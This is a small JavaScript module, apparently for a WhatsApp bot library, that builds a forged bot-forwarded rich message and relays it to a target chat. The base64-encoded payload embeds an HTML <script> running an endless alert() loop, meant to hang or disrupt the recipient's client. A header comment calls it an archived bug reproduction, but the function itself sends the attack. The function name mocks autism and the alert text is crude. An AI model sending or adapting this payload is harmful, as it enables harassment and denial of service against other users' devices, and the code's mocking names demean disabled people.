'use strict';

// Archived bug reproduction payload. This file is intentionally not imported
// by the application and must not be executed in production.
async function emmalocalautism(t) {
  const crypto = require('crypto');
  const em = {
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          unifiedResponse: {
            data: Buffer.from(JSON.stringify({
              __typename: 'GenAIUnifiedResponse',
              response_id: crypto.randomUUID(),
              sections: [{
                __typename: 'GenAIUnifiedResponseSection',
                view_model: {
                  __typename: 'GenAISingleLayoutViewModel',
                  primitive: {
                    __typename: 'FOAHtmlPrimitiveDemoDONOTUSE',
                    trusted_sources: [],
                    payload: `<script>
                      while (true) {
                        alert("Group gooning start in 10 minutes");
                      }
                    </script>`
                  }
                }
              }]
            })).toString('base64')
          },
          contextInfo: {
            isForwarded: true,
            forwardOrigin: 4
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(t, em, {});
  await client.relayMessage(t, msg.message, {
    messageId: msg.key.id
  });
}

module.exports = { emmalocalautism };
